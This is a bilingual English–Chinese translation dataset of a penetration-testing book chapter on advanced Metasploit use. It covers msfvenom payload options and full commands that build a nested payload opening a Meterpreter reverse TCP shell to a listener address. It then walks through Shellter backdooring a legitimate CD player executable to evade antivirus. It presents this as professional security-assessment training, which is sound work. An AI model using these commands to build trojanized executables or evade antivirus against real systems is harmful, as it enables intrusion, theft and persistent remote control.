- en: '*Chapter 7*: Advanced Exploitation with Metasploit'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第7章*：使用 Metasploit 进行高级利用'
- en: Anyone who has been in the field in the last 18 years knows what Metasploit
    can do. There are all kinds of Metasploiters out there, but we’re going to think
    about two kinds in particular. First, you have the intrepid amateur. They downloaded
    Kali Linux and installed it on a **Virtual Machine** (**VM**). Then, they fired
    up Metasploit and learned the basics – how to set an exploit, a payload, and the
    options, and then launch missiles! In this scenario, Metasploit quickly becomes
    the metaphorical hammer, and every problem starts to look like a nail.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 任何在过去 18 年里从事过这方面工作的人都知道 Metasploit 能做什么。外面有各种各样的 Metasploit 使用者，但我们特别考虑其中两类人。首先是勇敢的业余爱好者。他们下载了
    Kali Linux 并将其安装在 **虚拟机**（**VM**）上。接着，他们启动 Metasploit 学习基础知识——如何设置漏洞利用、有效载荷和选项，然后发射“导弹”！在这种情况下，Metasploit
    很快就成为了隐喻中的锤子，而每个问题看起来都像钉子。
- en: On the other hand, there is the seasoned security administrator, who is comfortable
    with the command line. They fire up Metasploit and know how to search for specific
    modules, as well as how to gather the appropriate information to populate options
    fields. However, they feel bound by what’s already there. They recently found
    that they could make their life a lot easier by configuring quick-and-dirty servers
    for capturing packets of a particular protocol, and they wish the same solution
    could be fired up as a module. In this chapter, we will take a look at the more
    advanced uses of Metasploit. Though we only have limited pages to whet our appetites,
    this chapter should provide you with enough content to encourage fruitful research
    beyond these pages.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 另一方面，有经验的安全管理员通常习惯于命令行。他们启动 Metasploit，知道如何搜索特定模块，以及如何收集适当的信息以填充选项字段。然而，他们感觉被现有的东西束缚住了。他们最近发现，通过配置快速简易的服务器来捕获特定协议的数据包，可以大大简化工作，而他们希望同样的解决方案可以作为一个模块启动。本章将介绍
    Metasploit 的更高级用法。尽管我们只有有限的页面来激发兴趣，但本章应为你提供足够的内容，鼓励你在这些页面之外进行深入的研究。
- en: 'In this chapter, we will cover the following topics:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖以下内容：
- en: Generating and nesting payloads with **msfvenom**
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 **msfvenom** 生成并嵌套有效载荷
- en: Working with Shellter
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 与 Shellter 一起工作
- en: The inner workings of Metasploit modules
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploit 模块的内部工作原理
- en: Working with Armitage
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 与 Armitage 一起工作
- en: The social engineering angle
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 社会工程学角度
- en: Technical requirements
  id: totrans-9
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'To get the most out of the hands-on material in this chapter, you’ll need the
    following equipment:'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 为了充分利用本章的实践材料，你将需要以下设备：
- en: A laptop running Kali Linux
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 运行 Kali Linux 的笔记本电脑
- en: Wine32 for Linux
  id: totrans-12
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Linux 上的 Wine32
- en: Shellter
  id: totrans-13
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Shellter
- en: A USB thumb drive
  id: totrans-14
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一只 USB 闪存驱动器
- en: How to get it right the first time – generating payloads
  id: totrans-15
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何第一次就做对——生成有效载荷
- en: We’ve all seen some people who get their hands on Metasploit and start pulling
    the trigger. If you’re in your lab at home and are just watching what happens,
    that’s fine. If you do that on a professional assessment, you’re likely to get
    caught, setting off alarms without even getting anywhere. After all, pen testing
    isn’t about hacking a sitting duck – your client will have defenses that, for
    the most part, will be pretty solid. If your client isn’t good at prevention,
    they’ll probably be good at detection, and poorly crafted payloads hitting random
    IPs is a no-brainer for a defender. With this in mind, we need to learn how to
    craft our payloads according to the task at hand to maximize our success. The
    more successful we are, the more value we can bring to our client.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 我们都见过一些人拿到 Metasploit 就开始开枪。如果你在家里的实验室里，单纯地看看发生了什么，那也没问题。如果你在进行专业评估时这么做，你很可能会被抓住，触发警报却什么也没做成。毕竟，渗透测试不是攻击一只坐着的鸭子——你的客户会有防御措施，大多数情况下这些防御都相当坚固。如果你的客户在预防方面不太行，他们很可能在检测方面做得很好，而且乱打有效载荷并击中随机
    IP 对防守者来说简直是轻松的事。考虑到这一点，我们需要学会根据任务的需要制作有效载荷，以最大化成功率。我们越成功，就能为客户带来更多的价值。
- en: Installing Wine32 and Shellter
  id: totrans-17
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 安装 Wine32 和 Shellter
- en: Thankfully, Wine32 and Shellter are both included in Kali’s repository, so installing
    them is easy. We always recommend performing a documentation review on everything
    we install, but we particularly suggest it for Shellter.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 幸运的是，Wine32 和 Shellter 都包含在 Kali 的软件库中，因此安装它们非常简单。我们始终建议在安装任何软件之前进行文档审核，但我们特别建议对
    Shellter 进行此操作。
- en: 'While Wine32 is already installed on Kali, you’ll need to install Wine32 when
    you’re running Kali on a 64-bit system. To install Wine32, enter the following
    command:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然Kali上已经安装了Wine32，但如果你在64位系统上运行Kali，你需要安装Wine32。安装Wine32的命令如下：
- en: dpkg --add-architecture i386 && apt-get update && apt-get install wine32
  id: totrans-20
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: dpkg --add-architecture i386 && apt-get update && apt-get install wine32
- en: That’s all it takes! How much you use Wine32 will depend on your needs; if you’re
    out in the field running Linux VMs on a Windows host, you probably won’t take
    Wine32 to its limits. But if you have some flavor of Linux as your home OS, you’ll
    like Wine32’s performance advantages over a VM or emulator environment.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 就这么简单！你使用Wine32的频率取决于你的需求；如果你在实战中运行Linux虚拟机（VM）在Windows主机上，你可能不会把Wine32用到极限。但如果你以某种Linux版本作为主操作系统，你会更喜欢Wine32在性能上相较虚拟机或模拟器的优势。
- en: 'To set up Shellter, a native Windows application, use the following command:'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 要设置Shellter这个原生Windows应用程序，请使用以下命令：
- en: apt-get install shellter
  id: totrans-23
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: apt-get install shellter
- en: And that’s it! You’re now ready to play with Windows executables within Kali
    and dynamically inject evasive shellcode into applications – something we’ll look
    into in more depth in [*Chapter 10*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187),
    *Shellcoding - The Stack*.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 就是这样！你现在已经准备好在Kali中玩Windows可执行文件，并动态注入规避的Shellcode到应用程序中——这一点我们会在[*第10章*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187)《Shellcoding
    - The Stack》中详细探讨。
- en: Payload generation goes solo – working with msfvenom
  id: totrans-25
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 有效载荷生成独立进行——使用msfvenom
- en: Back in the old days, there were separate instances of the Metasploit Framework
    that you could fire up from the command line for generating payloads – they were
    **msfpayload** and **msfencode**. Kids these days can generate payloads with the
    one-stop-shop Metasploit Framework instance called **msfvenom**. Aside from the
    obvious advantage of a single command line with standardized flags for fine-tuning
    your attack, **msfvenom** is also faster.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 在过去，你可以通过命令行启动Metasploit Framework的不同实例来生成有效载荷——它们分别是**msfpayload**和**msfencode**。现在的孩子们可以通过一个统一的Metasploit
    Framework实例**msfvenom**来生成有效载荷。除了显而易见的优势——一个统一的命令行和标准化的参数来精细调整攻击，**msfvenom**的速度也更快。
- en: So, what are payloads? It’s best if we first understand the core structure of
    Metasploit – **modules**. Modules are objects within Metasploit that get a certain
    job done, and the nature of the task defines the type of module. Payloads are
    just a module type within Metasploit, and their job is to contain code for remote
    execution. Payloads are used by exploit modules, which are delivery systems for
    our payload. We will discuss that in more detail later. For now, we’re looking
    at payload generation that can stand alone. This will give you unmatched flexibility
    when you’re in the field.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 那么，什么是有效载荷（payload）呢？我们最好首先理解一下Metasploit的核心结构——**模块**。模块是Metasploit中的对象，用于完成某个特定的任务，任务的性质决定了模块的类型。有效载荷只是Metasploit中的一种模块类型，其任务是包含远程执行的代码。有效载荷由漏洞利用模块使用，漏洞利用模块是用于传送有效载荷的系统。我们稍后会更详细地讨论这一点。现在，我们来看一下可以独立运行的有效载荷生成，这将为你在实战中提供无与伦比的灵活性。
- en: There are three different kinds of payload – singles, stagers, and stages. Singles
    are the true standalones of the bunch. They don’t even need to talk to Metasploit
    to phone home – you can catch them with a simple **netcat** command. Stagers and
    stages are related but distinct; a stager sets the stage for getting data to and
    from a target. In short, a stager creates a network connection. A stager payload
    is going to execute and then try to phone home, and since the connection is coming
    from inside, we can get around pesky **Network Address Translation** (**NAT**)
    firewalls. Stages are the payload components that are conveyed to the target by
    the stager. Let’s use a very common Meterpreter connect-back example – the Meterpreter
    component itself is the stage, and the module that creates the TCP connection
    back to the attacker is the stager. Of course, there’s no point in phoning home
    if no one is answering, so we must rely on handlers to receive and handle any
    connections.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 有三种不同类型的负载 – singles、stagers 和 stages。 Singles 是这些中真正的独立体。 它们甚至不需要与 Metasploit
    通信即可回传– 你可以用简单的 **netcat** 命令捕获它们。 Stagers 和 stages 相关但有区别； 一个 stager 为获取与目标之间的数据设置阶段。
    简而言之，stager 创建网络连接。 stager 负载将会执行然后试图回传，而且由于连接来自内部，我们可以绕过讨厌的 **Network Address
    Translation** (**NAT**) 防火墙。 Stages 是通过 stager 传送到目标的负载组件。 让我们使用一个非常常见的 Meterpreter
    回连示例 – Meterpreter 组件本身是 stage，而创建 TCP 连接返回给攻击者的模块则是 stager。 当然，如果无人响应，那么回传毫无意义，所以我们必须依赖处理程序来接收和处理任何连接。
- en: 'Let’s check out what **msfvenom** offers us when we fire it up in a terminal
    window. Please note that for illustrative purposes, we will define the full names
    of the options. You are welcome to use the shorter flags in practice (for example, **--payload**
    is the same as **-p**):'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们查看在终端窗口启动 **msfvenom** 时，它为我们提供了什么。 请注意，出于说明目的，我们将定义选项的完整名称。 在实践中，您可以使用更短的标志（例如，
    **--payload** 等同于 **-p**）：
- en: msfvenom -h
  id: totrans-30
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom -h
- en: 'Let’s explore some command lines:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们探索一些命令行：
- en: The **--payload** command defines the payload we’re going to use. Think of this
    as a behavior; this is what our payload is going to do. We’ll take a good look
    at specific payloads next.
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--payload** 命令定义了我们将使用的 payload。 将其视为行为； 这是我们的 payload 将要执行的操作。 接下来我们将仔细研究特定的
    payloads。'
- en: The **--list** command will output the available modules for a given module
    type. So, let’s say you’re stuck on **–payload**; you can issue **msfvenom --list
    payloads** to get the list. However, if you don’t already know exactly what to
    build, you may need this list of available modules. If you’d rather utilize the
    search function in **msfconsole**, don’t worry – we’ll look at that next.
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--list** 命令将输出给定模块类型的可用模块。 所以，假设你在 **--payload** 方面遇到问题； 你可以发出 **msfvenom
    --list payloads** 命令获取列表。 但是，如果你不确定到底需要构建什么，你可能需要这些可用模块的列表。 如果你更喜欢在 **msfconsole**
    中使用搜索功能，不要担心 – 我们将在接下来看一下。'
- en: The **--nopsled** command is a shellcoding option that we will explore in more
    detail in [*Chapter 10*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187), *Shellcoding
    - The Stack*.
  id: totrans-34
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--nopsled** 命令是一个 shellcoding 选项，我们将在 [*Chapter 10*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187)
    中更详细地探讨它，*Shellcoding - The Stack*。'
- en: The **--format** command represents the file type that will be created. This
    is where you’d specify EXE for when you’re making dastardly executables. This
    particular option, however, is an area where the flexibility of **msfvenom** shines,
    as many formats are available. We’ll be looking at a few in this book, but commanding
    **--help-formats** will help you get acquainted.
  id: totrans-35
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--format** 命令表示将要创建的文件类型。 这是你制作卑鄙可执行文件时应指定的地方。 然而，**msfvenom** 灵活性的一个领域显现在这里，因为有许多可用的格式。
    在本书中，我们将查看其中几个，但是通过 **--help-formats** 命令可以帮助你熟悉它们。'
- en: The **--encoder** command is another option that we’ll dive into in greater
    detail in [*Chapter 10*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187), *Shellcoding
    - The Stack*. An encoder can change how code looks without changing the underlying
    functionality. For example, perhaps your payload needs to be encoded in an alphanumeric
    representation, or you need to eliminate characters that break execution. You
    would combine this with **--bad-chars** to get rid of code-breaking characters
    such as **0x00**. How a payload is encoded can be repeated over and over again
    with **--iterations**, which defines the number of passes through the encoder.
    This can make the payload a little stealthier (meaning it’s harder to detect),
    but it’s worth pointing out that encoding isn’t meant to bypass anything – its
    real purpose is to get the code ready for a particular environment.
  id: totrans-36
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--encoder** 命令是另一个选项，我们将在 [*第 10 章*](B17616_10_Final_VK_ePub.xhtml#_idTextAnchor187)
    中更详细地讨论，*Shellcoding - The Stack*。编码器可以改变代码的外观，而不改变其底层功能。例如，也许你的负载需要以字母数字表示法进行编码，或者你需要去除破坏执行的字符。你可以将其与
    **--bad-chars** 结合使用，去除如 **0x00** 这样的破坏执行的字符。负载的编码可以通过 **--iterations** 重复多次，定义了编码器的遍历次数。这可以使负载更加隐蔽（即更难被检测到），但值得指出的是，编码并不是为了绕过任何东西——它的真正目的是让代码准备好在特定的环境中运行。'
- en: '**--arch** and **--platform** allow you to specify the environment where a
    payload is going to run; for example, 32-bit (instruction set architecture) Windows
    (platform).'
  id: totrans-37
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--arch** 和 **--platform** 允许你指定负载运行的环境；例如，32 位（指令集架构）Windows（平台）。'
- en: The **--space** command defines the maximum size of your payload in bytes. This
    is handy for situations where you know there is some sort of restriction. Encoded
    payload space is the same unless you want to define it as a different value. In
    this case, you’d use **--encoder-space**. **--smallest** is also useful, which
    generates the smallest possible payload.
  id: totrans-38
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--space** 命令定义了负载的最大大小（以字节为单位）。当你知道存在某种限制时，这个命令非常有用。编码后的负载空间与此相同，除非你希望将其定义为不同的值。在这种情况下，你可以使用
    **--encoder-space**。**--smallest** 也很有用，它生成最小可能的负载。'
- en: '**--add-code** allows us to create a *two-for-one* deal by injecting the shellcode
    from a different generated payload into this payload. The source can be an executable
    or it can even be the raw output from a previous run of **msfvenom**. You can
    do this a few times over, potentially embedding several payloads into one. Though
    in reality, you’ll likely run into encoding problems if you do this.'
  id: totrans-39
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--add-code** 允许我们通过将来自不同生成负载的 shellcode 注入到这个负载中，创建一个 *一举两得* 的局面。源代码可以是可执行文件，甚至可以是
    **msfvenom** 上一次运行的原始输出。你可以多次执行此操作，可能会将多个负载嵌入到一个中。不过实际上，如果这样做，你可能会遇到编码问题。'
- en: The **--template** command allows you to use an existing executable as a template.
    A Windows executable is made up of many pieces, so you can’t just spit out some
    shellcode on its own – it needs to go somewhere. A template contains everything
    that’s needed to make a working executable – it’s just waiting for you to put
    your shellcode in it. You could also identify a specific executable here if you
    wish, and **msfvenom** will dump your payload into the text section of the executable
    (where general-purpose code that’s been put together by a compiler is located).
    This is powerful on its own, but this option is made all the more covert when
    it’s used in tandem with **--keep**, which keeps the original functionality of
    the template EXE and puts your shellcode in a new thread at execution.
  id: totrans-40
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--template** 命令允许你使用现有的可执行文件作为模板。Windows 可执行文件由多个部分组成，因此你不能仅仅输出一些 shellcode
    – 它需要放置在某个地方。模板包含了制作有效可执行文件所需的一切——它只是等待你将 shellcode 放入其中。如果你愿意，还可以在此处指定特定的可执行文件，**msfvenom**
    会将负载转储到可执行文件的文本部分（编译器生成的通用代码所在的位置）。这一点本身就很强大，但当与 **--keep** 一起使用时，模板 EXE 的原始功能得以保留，shellcode
    会被放入一个新的执行线程中，这使得该选项更加隐蔽。'
- en: The **--out** command defines the path where our payload gets spat out.
  id: totrans-41
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--out** 命令定义了我们的负载输出的路径。'
- en: The **--var-name** command will matter to us when we cover shellcoding, but
    even then, it doesn’t do much. It’s really for those who like to stand apart from
    the crowd and use custom output variable names.
  id: totrans-42
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--var-name** 命令在我们讨论 shellcoding 时会对我们有用，但即便如此，它也不会做太多事情。它真正是为那些喜欢与众不同并使用自定义输出变量名称的人准备的。'
- en: The **--timeout** command is a newer feature for generating large payloads;
    it prevents timeouts while the payload is being read. The need for this came about
    from users who were piping the output of **msfvenom** into **msfvenom**. You probably
    won’t use this option, but it’s nice to know it’s there.
  id: totrans-43
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**--timeout** 命令是生成大有效载荷的一个新特性；它防止在读取有效载荷时出现超时。这个需求来自那些将**msfvenom**的输出通过管道传递到**msfvenom**的用户。你可能不会使用这个选项，但知道它的存在还是挺不错的。'
- en: Now that we have an idea of the power that this tool provides, it’s time to
    conduct a single attack with two payloads.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经了解了这个工具的强大功能，是时候进行一次包含两个有效载荷的攻击演示了。
- en: Creating nested payloads
  id: totrans-45
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 创建嵌套的有效载荷
- en: Now, we’re going to prepare a demonstration for a client where the payload will
    display a message to the user that says **You got pwned bro!** while also creating
    a Meterpreter session for the listening handler.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将为客户准备一个演示，在该演示中，有效载荷将显示一条消息给用户，内容是**你被搞定了，兄弟！**，同时为监听处理器创建一个Meterpreter会话。
- en: 'There are two payloads, so there are two commands we must use; they are as
    follows:'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 有两个有效载荷，所以我们必须使用两个命令，它们如下：
- en: msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=INFORMATION
    TITLE="Sorry" TEXT="You got pwned bro! " --format raw > Payload1
  id: totrans-48
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom --arch x86 --platform windows --payload windows/messagebox ICON=INFORMATION
    TITLE="抱歉" TEXT="你被搞定了，兄弟！" --format raw > Payload1
- en: msfvenom --add-code Payload1 --arch x86 --platform windows --payload windows/meterpreter_reverse_tcp
    LHOST=192.168.108.106 LPORT=4567 --format exe > demo.exe
  id: totrans-49
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: msfvenom --add-code Payload1 --arch x86 --platform windows --payload windows/meterpreter_reverse_tcp
    LHOST=192.168.108.106 LPORT=4567 --format exe > demo.exe
- en: 'With that, we’ve set the target architecture and platform to 32-bit Windows
    in both commands. In the first command, we set the payload to **windows/messagebox**
    and set the **ICON**, **TITLE**, and **TEXT** payload options. (If you’re going
    to use the exclamation mark, as we’ve done here, put a space after it so that
    you don’t escape the closing quotation marks, or use single quotes.) The format
    is raw binary as we’re going to import it into the next command with the **--add-** code.
    The second payload is **windows/meterpreter_reverse_tcp**, which is a Meterpreter
    session that connects back to us at **LHOST** (in reverse) over a TCP port, which
    we have defined with **LPORT**. Finally, we want to spit out the result in EXE
    format. Be mindful that this is just a demonstration; we would usually recommend
    other combinations of payloads, as message boxes are not exactly stealthy:'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 到此为止，我们已经在两个命令中将目标架构和平台设置为32位Windows。在第一个命令中，我们将有效载荷设置为**windows/messagebox**，并设置了**ICON**、**TITLE**和**TEXT**有效载荷选项。（如果你要使用感叹号，就像我们在这里做的一样，在它后面加个空格，避免转义结束的引号，或者使用单引号。）格式是原始二进制格式，因为我们将把它导入到下一个命令中并使用**--add-**code。第二个有效载荷是**windows/meterpreter_reverse_tcp**，它是一个Meterpreter会话，连接回我们通过**LHOST**（反向）并通过TCP端口连接，我们通过**LPORT**定义了端口。最后，我们希望将结果输出为EXE格式。请注意，这只是一个演示；我们通常会推荐其他有效载荷的组合，因为消息框并不算隐蔽：
- en: '![Figure 7.1 – The result of our payload’s execution ](image/Figure_7.1_B17616.jpg)'
  id: totrans-51
  prefs: []
  type: TYPE_IMG
  zh: '![图7.1 – 我们的有效载荷执行结果](image/Figure_7.1_B17616.jpg)'
- en: Figure 7.1 – The result of our payload’s execution
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 图7.1 – 我们的有效载荷执行结果
- en: Although we’ll be looking at the finer points of shellcoding later in this book,
    it’s worth mentioning that combining payloads is bound to put bad characters into
    your masterpiece. You should confirm your result in a test environment, using
    **--bad-chars** to eliminate things such as null bytes, which will almost definitely
    break Windows shellcode. Generating working shellcode isn’t magic, so don’t be
    surprised if certain payloads simply can’t be encoded!
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然我们将在本书后面讨论shellcoding的细节，但值得一提的是，组合有效载荷很可能会在你的作品中引入不良字符。你应该在测试环境中验证你的结果，使用**--bad-chars**来消除类似空字节之类的字符，这些字符几乎肯定会破坏Windows的shellcode。生成有效的shellcode并非魔法，因此如果某些有效载荷无法被编码，不要感到惊讶！
- en: Helter skelter – evading antivirus with Shellter
  id: totrans-54
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 大乱斗 – 使用Shellter绕过防病毒软件
- en: 'Let’s take a look at the following steps:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来看一下以下步骤：
- en: 'First, we need to start Shellter. To fire up Shellter, use the following command
    line:'
  id: totrans-56
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，我们需要启动Shellter。要启动Shellter，请使用以下命令行：
- en: shellter
  id: totrans-57
  prefs:
  - PREF_IND
  - PREF_H1
  type: TYPE_NORMAL
  zh: shellter
- en: 'Since we’re total noobs right now, we’ll be using Auto Mode here. Next, we
    need to identify the executable that we’re going to backdoor:'
  id: totrans-58
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 由于我们现在完全是新手，我们将在这里使用自动模式。接下来，我们需要确定要后门化的可执行文件：
- en: '![Figure 7.2 – Loading Shellter in Wine32 ](image/Figure_7.2_B17616.jpg)'
  id: totrans-59
  prefs: []
  type: TYPE_IMG
  zh: '![图7.2 – 在Wine32中加载Shellter](image/Figure_7.2_B17616.jpg)'
- en: Figure 7.2 – Loading Shellter in Wine32
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 图7.2 – 在Wine32中加载Shellter
- en: Aside from ensuring that the executable is 32-bit, a good practice is to use
    an executable that can stand alone. Dependencies on proprietary DLLs often cause
    trouble. You should also verify that the program is considered clean by antivirus
    engines before you inject code into it; false positives are a reality of life
    in the antivirus world, and no amount of stealth during injection will change
    any inherently suspicious behavior.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 除了确保可执行文件是 32 位的，良好的做法是使用一个能够独立运行的可执行文件。依赖于专有 DLL 文件通常会引发问题。在将代码注入到程序中之前，你还应验证该程序是否被杀毒引擎认为是干净的；误报是杀毒软件中常见的现象，在注入过程中再怎么隐蔽也无法改变程序中固有的可疑行为。
- en: Note
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 注意
- en: At the time of writing, x64 injection is possible with the paid version of Shellter.
    Licenses are only for practicing professionals, but if it’s in your budget, I
    recommend supporting the project.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 在撰写时，x64 注入功能已经在 Shellter 的付费版本中可用。许可证仅限于专业人士使用，但如果你的预算允许，推荐支持这个项目。
- en: For our demonstration, we’re going to work with an old CD player utility for
    Windows. A 32-bit copy will run on pretty much any Windows system on its own –
    it just needs to be downloaded and executed. While we’re on the subject of picking
    executables for this purpose, we recommend being kind to the community and being
    creative with your work. For example, now that we’ve written this demo with **CDPlayer.exe**,
    it’s out there for the world to see and antivirus engines will have better heuristics
    for it. There’s often a tendency to repeat familiar processes, but it’s better
    to be creative.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们的演示中，我们将使用一个适用于 Windows 的老旧 CD 播放器工具。32 位版本可以在几乎所有 Windows 系统上独立运行——只需要下载并执行即可。说到选择可执行文件用于此目的，我们建议对社区保持友善，并在工作中发挥创造力。例如，现在我们已经用
    **CDPlayer.exe** 编写了这个演示，它已经公开，世界各地的杀毒引擎将能对其进行更好的启发式检测。人们常常倾向于重复熟悉的流程，但更好的做法是发挥创意。
- en: After identifying the executable that we’re injecting our payload into, we enter
    **Stealth Mode** and select our payload. As shown in the following screenshot,
    seven of Metasploit’s stagers are built-in.
  id: totrans-65
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在确定了我们要注入载荷的可执行文件后，我们进入 **隐形模式** 并选择我们的载荷。如以下截图所示，Metasploit 的七个启动器已内建。
- en: 'Shellter will ask you whether you have a custom payload (more on that later),
    but if your needs are covered by one of the existing seven, it’s best to just
    go with what works. In our case, we’re establishing a connect-back Meterpreter
    session, so we’ll go with payload index 1:'
  id: totrans-66
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Shellter 会询问你是否有自定义载荷（稍后会讲到），但是如果现有的七个载荷中的某一个能够满足你的需求，最好还是选择现有的载荷。我们这次的案例是建立一个回连的
    Meterpreter 会话，因此我们选择载荷索引 1：
- en: '![Figure 7.3 – Payload selection in Shellter ](image/Figure_7.3_B17616.jpg)'
  id: totrans-67
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.3 – Shellter 中的载荷选择](image/Figure_7.3_B17616.jpg)'
- en: Figure 7.3 – Payload selection in Shellter
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.3 – Shellter 中的载荷选择
- en: 'Shellter doesn’t take long once it has all the information it needs. The CD
    player will be injected and left where the original file is. Once the executable
    is on target, the victim fires it up, as shown in the following screenshot:'
  id: totrans-69
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦 Shellter 收集了所需的所有信息，它不会花太长时间。CD 播放器将被注入并保留在原始文件位置。一旦可执行文件传送到目标，受害者启动它，如下图所示：
- en: '![Figure 7.4 – The CD player program running on the target PC ](image/Figure_7.4_B17616.jpg)'
  id: totrans-70
  prefs: []
  type: TYPE_IMG
  zh: '![图 7.4 – CD 播放器程序在目标 PC 上运行](image/Figure_7.4_B17616.jpg)'
- en: Figure 7.4 – The CD player program running on the target PC
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 图 7.4 – CD 播放器程序在目标 PC 上运行
- en: Meanwhile, at our attacking Kali box, the Meterpreter session has received the
    inbound connection and gets to work. This isn’t the most interesting part, though;
    what’s notable here is that the original executable is functioning exactly as
    expected. The CD player works flawlessly while we get to work stealing loot and
    establishing persistence on our target. Cool, huh? Shellter pulls this off by
    analyzing the flow of execution in the legitimate program (done in the tracing
    stage we looked at earlier) and places the shellcode at a natural point in the
    flow. There isn’t a sudden redirection to somewhere else in the code or a weird
    memory request, as you may see in non-dynamically infected executables. The code
    doesn’t look like something was injected into it; the code looks like it was always
    intended to do what it does, which is to provide users with a convenient way to
    play their old 1990s music CDs while quietly giving remote control to a third
    party of their computer.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 与此同时，在我们的攻击Kali主机上，Meterpreter会话已经接收到传入连接并开始工作。不过，这并不是最有趣的部分；这里值得注意的是，原始可执行文件的运行与预期完全一致。CD播放器完美运行，同时我们开始偷取战利品并在目标上建立持久化。很酷吧？Shellter通过分析合法程序的执行流程（我们之前在追踪阶段已经看过）并将shellcode放置在流程中的自然位置，成功地实现了这一点。并没有突然的重定向到代码的其他地方，也没有奇怪的内存请求，正如你在非动态感染的可执行文件中可能看到的那样。代码看起来不像是被注入的；它看起来就像是本来就应该做它做的事，那就是为用户提供一个方便的方式播放他们的1990年代老音乐CD，同时悄悄地将计算机的远程控制交给第三方。
- en: Establishing control of a target while the user listens to music can be fun,
    but it can also demonstrate the extent of Shellter’s power. For example, when
    we checked the file we generated against the main players in the antivirus market,
    we discovered that we successfully evaded 67% of all vendors. As you can see,
    Shellter incorporates shellcode into the natural flow of execution in such a novel
    way that it can be very difficult to detect.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
